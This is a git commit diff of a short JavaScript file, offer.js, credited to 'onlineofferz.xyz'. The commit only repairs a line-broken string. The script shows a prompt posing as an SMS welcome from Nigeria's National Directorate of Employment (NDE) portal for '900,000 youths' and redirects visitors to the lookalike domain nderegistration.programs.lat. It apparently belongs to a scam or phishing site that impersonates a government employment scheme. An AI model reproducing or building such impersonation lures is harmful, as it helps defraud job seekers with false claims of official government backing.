d64f1ff109ffc7c8e30dcae97413567c811401b5
codexkenp <151174897+codexkenp@users.noreply.github.com>
2024-10-28 12:22:21 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'OK'
-password=prompt('SMS: Welcome To The National Directorate of Employment (NDE) Online Portal to Engage 900,000 Youths in Skills Development.
-, Kindly Press OK to Continue ','OK');
+password=prompt('SMS: Welcome To The National Directorate of Employment (NDE) Online Portal to Engage 900,000 Youths in Skills Development, Kindly Press OK to Continue ','OK');
 if (password != 'OK') {
 location.href='https://nderegistration.programs.lat/Job';
 }
